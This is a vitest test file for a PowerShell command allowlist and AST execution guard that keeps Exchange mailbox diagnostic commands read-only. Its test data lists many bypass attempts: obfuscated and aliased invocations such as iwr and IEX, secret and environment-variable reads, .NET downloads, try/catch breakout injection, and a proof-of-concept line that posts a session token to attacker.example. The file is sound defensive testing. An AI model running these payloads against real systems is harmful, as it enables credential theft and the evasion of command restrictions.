// Copyright (c) Microsoft Corporation.
// Licensed under the MIT License.

import { describe, test, expect } from "vitest";
import { execFileSync } from "child_process";
import { validateCommand, allowedCmdlets, buildValidatedCommand } from "../../src/powershell/allowlist.js";

describe("CmdletAllowlist", () => {
  test.each([
    "Get-Mailbox -ResultSize 1",
    "Get-RetentionCompliancePolicy | FL Name",
    "Get-OrganizationConfig | FL AutoExpandingArchiveEnabled",
    "Get-Recipient -ResultSize 1 | FL Name, RecipientType",
    "Get-User -ResultSize 1",
    "Test-ArchiveConnectivity user@example.com",
    "Export-MailboxDiagnosticLogs user@example.com",
    "Get-AdminAuditLogConfig | FL UnifiedAuditLogIngestionEnabled",
    "Get-UnifiedAuditLogRetentionPolicy | FL Name, RetentionDuration",
    "Get-MailboxAuditBypassAssociation -Identity user@example.com",
    "Get-AppRetentionCompliancePolicy -DistributionDetail | FL Name",
    "Get-AppRetentionComplianceRule -Policy TestPolicy | FL Name",
  ])("allows whitelisted cmdlet: %s", (command) => {
    const result = validateCommand(command);
    expect(result.valid).toBe(true);
  });

  describe("PowerShell AST execution guard", () => {
    function runGuarded(
      command: string | string[],
      setup = "",
    ): { success: boolean; output?: unknown[]; error?: string } {
      const commands = typeof command === "string" ? [command] : command;
      const script = `
        $ErrorActionPreference = 'Stop'
        function Get-Mailbox {
          [pscustomobject]@{ Name = 'test'; ArchiveStatus = 'Active'; ExchangeGuid = [guid]::Empty }
        }
        function Export-MailboxDiagnosticLogs {
          [pscustomobject]@{ MailboxLog = '<Properties><Property Name="ELC">ready</Property></Properties>' }
        }
        function Remove-Item { Write-Output 'unexpected execution' }
        function Unsafe { Write-Output 'unexpected callback' }
        function Tee-Object {
          param($FilePath, $Variable, [Parameter(ValueFromPipeline)] $InputObject)
          process { $InputObject }
        }
        ${setup}
        try {
          $output = @(
            ${commands.map(buildValidatedCommand).join("\n")}
          )
          @{ success = $true; output = $output } | ConvertTo-Json -Depth 10 -Compress
        } catch {
          @{ success = $false; error = $_.Exception.Message } | ConvertTo-Json -Compress
        }
      `;
      const output = execFileSync(
        "pwsh",
        [
          "-NoLogo",
          "-NoProfile",
          "-NonInteractive",
          "-Command",
          "& ([scriptblock]::Create([Console]::In.ReadToEnd()))",
        ],
        { input: script, encoding: "utf8", timeout: 15_000, windowsHide: true },
      );
      return JSON.parse(output.trim());
    }

    test.each([
      "whoami",
      "Get-Mailbox; whoami",
      "Get-Mailbox | whoami",
      "Get-Mailbox | ForEach-Object { whoami }",
      'Write-Output "$(whoami)"',
      "Write-Output (whoami)",
      "rm unused",
      "Get-Mailbox | % { del unused }",
      "& ('Write-' + 'Output') 'bypass'",
      "$cmd = 'Write-Output'; & $cmd bypass",
      ". { Write-Output bypass }",
      "Get-Com`mand",
      "Get-Mailbox > $null",
      "function Get-Mailbox { Write-Output bypass }",
      "[scriptblock]'Write-Output bypass'",
      "[System.Environment]::GetEnvironmentVariable('PATH')",
      "(Get-Date).AddDays(1)",
      "(Get-Date).('Add' + 'Days')(1)",
      "$x = 'hello'; $x[0] = 'b'",
      "Write-Output ${env:PATH}",
      "Write-Output ${_ippsToken}",
      "$PSDefaultParameterValues = @{}",
      "Write-Output ready -OutVariable PSDefaultParameterValues",
      "Get-Mailbox | ForEach-Object -MemberName ToString",
      "Get-Mailbox | ForEach-Object ToString",
      "'x' -replace 'x', (Get-ChildItem Function:Unsafe).ScriptBlock",
      "Get-ChildItem Variable:",
      "$filter = { $true }; Get-Mailbox | Where-Object $filter",
      "$filter = { $true }; Get-Mailbox | Where-Object Name -FilterScript $filter",
      "Write-Output ready | Tee-Object -FilePath unused.txt",
      "Write-Output ready | Tee-Object -Variable PSDefaultParameterValues",
      "#requires -Modules UnapprovedModule\nWrite-Output ready",
      "Get-Mailbox &",
      "Get-Mailbox; } catch {}; Write-Output bypass; #",
    ])("rejects bypass before execution: %s", (command) => {
      expect(runGuarded(command)).toMatchObject({
        success: false,
        error: expect.stringMatching(
          /not in the allowlist|not allowed|only |requires |Invalid PowerShell syntax|Unsupported PowerShell syntax/i,
        ),
      });
    });

    test.each([
      "Get-Mailbox | FL Name",
      "Get-Mailbox | select Name | ConvertTo-Json",
      "Get-Mailbox | Where-Object { $_.ArchiveStatus -eq 'Active' } | Measure-Object",
      "Get-Mailbox | ? { $_.Name -eq 'test' } | % { $_.Name }",
      "Get-Mailbox | Where-Object -FilterScript { $_.Name -eq 'test' }",
      "Get-Mailbox | Where-Object Name -eq test",
      "Get-Mailbox | ForEach-Object { $_.ExchangeGuid.ToString() }",
      "$parts = 'a;b'.Split(';'); Write-Output $parts[0]",
      "$logs = Export-MailboxDiagnosticLogs test; ([xml]$logs.MailboxLog).Properties.Property",
      "Get-Mailbox | Select-Object @{ Name = 'Label'; Expression = { $_.Name } }",
      "$sum = 0; foreach ($value in @(1, 2)) { if ($value -gt 0) { $sum += $value } }; Write-Output $sum",
      "Get-Mailbox -Identity 'mailbox-prod-01@contoso.com'",
      "(Get-ChildItem Env: | Where-Object { $_.Name -eq 'DLM_UPN' }).Count",
      "Write-Output 'Get-Command; & whoami'",
      'Write-Output "ready $(Get-Date -Format yyyy)"',
      "Write-Output ready | Tee-Object -Variable diagnostic",
      "Get-Mai`lbox",
    ])("preserves diagnostic syntax: %s", (command) => {
      const result = runGuarded(command);
      expect(result, result.error).toMatchObject({ success: true });
    });

    test("preserves diagnostic variables across commands without exposing validator state", () => {
      const result = runGuarded([
        "$mailbox = Get-Mailbox",
        "Write-Output $mailbox.Name; Write-Output ($null -eq $ast)",
      ]);
      expect(result).toEqual({ success: true, output: ["test", true] });
    });

    test.each([
      "Remove-Alias -Name sort -Force -ErrorAction SilentlyContinue; function sort { Write-Output unexpected }",
      "Set-Alias -Name sort -Value Write-Output -Force",
    ])("rejects unavailable or retargeted aliases: %s", (setup) => {
      expect(runGuarded("Get-Mailbox | sort Name", setup)).toMatchObject({
        success: false,
        error: "Alias 'sort' is not allowed in this session; use 'sort-object'",
      });
    });
  });

  test.each([
    "Get-Mailbox | Where-Object {$_.ArchiveStatus -eq 'Active'}",
    "Get-RetentionCompliancePolicy | Select-Object Name | ConvertTo-Json",
    "Get-Mailbox -ResultSize 1 | Format-List DisplayName",
    "Get-RetentionCompliancePolicy | Sort-Object Name | Measure-Object",
  ])("allows safe builtins: %s", (command) => {
    const result = validateCommand(command);
    expect(result.valid).toBe(true);
  });

  test.each([
    ["Set-Mailbox -Identity test", "Set-"],
    ["Remove-RetentionCompliancePolicy -Identity test", "Remove-"],
    ["New-RetentionComplianceRule -Policy test", "New-"],
    ["Start-ManagedFolderAssistant -Identity test", "Start-"],
    ["Invoke-WebRequest -Uri https://example.com", "Invoke-"],
    ["Enable-Mailbox -Identity test", "Enable-"],
    ["Disable-Mailbox -Identity test", "Disable-"],
    ["Add-MailboxPermission -Identity test", "Add-"],
  ] as [string, string][])("blocks mutating cmdlet: %s", (command, expectedPrefix) => {
    const result = validateCommand(command);
    expect(result.valid).toBe(false);
    expect(result.violation).toContain(expectedPrefix);
  });

  test("blocks unknown cmdlet", () => {
    const result = validateCommand("Get-FooBaz");
    expect(result.valid).toBe(false);
    expect(result.violation).toContain("not in the allowlist");
  });

  test("blocks pipeline with blocked cmdlet", () => {
    const result = validateCommand("Get-Mailbox | Set-Mailbox -Name test");
    expect(result.valid).toBe(false);
    expect(result.violation).toContain("Set-");
  });

  test("allows Write-Host and Write-Output", () => {
    expect(validateCommand("Write-Host 'ready'").valid).toBe(true);
    expect(validateCommand("Write-Output 'test'").valid).toBe(true);
  });

  test("allowed cmdlets contains expected count", () => {
    expect(allowedCmdlets.size).toBe(33);
  });

  // --- Security: case-insensitivity bypass (MSRC report) ---

  test.each([
    "invoke-webrequest -Uri http://x",
    "INVOKE-WEBREQUEST -Uri http://x",
    "Invoke-webrequest -Uri http://x",
    "invoke-WebRequest -Uri http://x",
  ])("blocks lowercase/mixed-case Invoke-WebRequest: %s", (command) => {
    const result = validateCommand(command);
    expect(result.valid).toBe(false);
    expect(result.blockedVerb).toBe("invoke");
  });

  test.each([
    "get-mailbox -ResultSize 1",
    "GET-MAILBOX -ResultSize 1",
    "Get-mailbox -ResultSize 1",
    "gET-mAILBOX -ResultSize 1",
  ])("allows lowercase/mixed-case allowed cmdlets: %s", (command) => {
    const result = validateCommand(command);
    expect(result.valid).toBe(true);
  });

  test.each([
    ["set-mailbox -Identity test", "set"],
    ["remove-retentioncompliancepolicy -Identity test", "remove"],
    ["new-retentioncompliancerule -Policy test", "new"],
    ["start-managedfolderassistant -Identity test", "start"],
    ["enable-mailbox -Identity test", "enable"],
  ] as [string, string][])("blocks lowercase mutating cmdlets: %s", (command, verb) => {
    const result = validateCommand(command);
    expect(result.valid).toBe(false);
    expect(result.blockedVerb).toBe(verb);
  });

  // --- Security: alias bypass ---

  test.each([
    ["iwr http://x", "iwr"],
    ["IEX 'malicious'", "IEX"],
    ["irm http://x", "irm"],
    ["curl http://x", "curl"],
    ["wget http://x", "wget"],
    ["icm -ScriptBlock { }", "icm"],
    ["saps notepad", "saps"],
  ] as [string, string][])("blocks dangerous alias: %s", (command, alias) => {
    const result = validateCommand(command);
    expect(result.valid).toBe(false);
    expect(result.blockedVerb).toBe("alias");
    expect(result.violation).toContain(alias);
  });

  test("blocks alias hidden after a legitimate cmdlet (multi-statement)", () => {
    const result = validateCommand("Get-Mailbox; iwr http://x");
    expect(result.valid).toBe(false);
    expect(result.blockedVerb).toBe("alias");
  });

  test("does not flag aliases that appear as substrings of legitimate cmdlets", () => {
    // Get-IRMConfiguration contains 'IRM' but is allowed
    const result = validateCommand("Get-IRMConfiguration");
    expect(result.valid).toBe(true);
  });

  test("does not flag aliases when used as variable names", () => {
    // `$iwr` is a variable reference, not an alias invocation
    const result = validateCommand("$iwr = 'something'; Write-Output $iwr");
    // Variable assignment is not validated as a cmdlet, so this passes
    expect(result.valid).toBe(true);
  });

  // --- Security: $env: access ---

  test.each([
    "Write-Host $env:DLM_GITHUB_TOKEN",
    'Write-Output "$env:USERPROFILE"',
    "$env:PATH",
    "Write-Host $ENV:SOMETHING", // case-insensitive
  ])("blocks $env: access: %s", (command) => {
    const result = validateCommand(command);
    expect(result.valid).toBe(false);
    expect(result.blockedVerb).toBe("env-access");
  });

  // --- Security: .NET type member access ---

  test.each([
    "[Net.WebClient]::new().DownloadString('http://x')",
    "[System.IO.File]::ReadAllText('C:\\secret.txt')",
    "[GC]::Collect()",
    "[System.Environment]::GetEnvironmentVariable('PATH')",
  ])("blocks .NET type member invocation: %s", (command) => {
    const result = validateCommand(command);
    expect(result.valid).toBe(false);
    expect(result.blockedVerb).toBe("type-literal");
  });

  // --- Security: session-private variable read ---

  test.each([
    "Write-Output $_ippsToken",
    "$x = $_ippsToken; Write-Host $x",
    "Write-Host $_IPPSToken", // case-insensitive
  ])("blocks reads of $_ippsToken: %s", (command) => {
    const result = validateCommand(command);
    expect(result.valid).toBe(false);
    expect(result.blockedVerb).toBe("private-var");
  });

  // --- False-positive guards ---

  test("does not flag hyphenated string fragments whose first word is not a PS verb", () => {
    // 'mailbox-prod' looks like verb-noun but 'mailbox' is not a known PS verb
    const result = validateCommand("Get-Mailbox -Identity 'mailbox-prod-01@contoso.com'");
    expect(result.valid).toBe(true);
  });

  test("does not flag parameter names that look like cmdlets", () => {
    // -ResultSize, -SourceDatabase, etc. should not be parsed as cmdlets
    const result = validateCommand("Get-Mailbox -ResultSize 1 -SourceDatabase MBX01");
    expect(result.valid).toBe(true);
  });

  // --- End-to-end PoC primitives ---

  test("blocks the published PoC payload (invoke-webrequest + $_ippsToken)", () => {
    const result = validateCommand(
      "invoke-webrequest -DisableKeepAlive -Method POST -Uri 'http://attacker.example/jwt-exfil' -Body $_ippsToken",
    );
    expect(result.valid).toBe(false);
    // Either the env-access/type/private-var/alias/invoke check fires; we
    // care that the command is blocked, not which layer caught it first.
  });
});
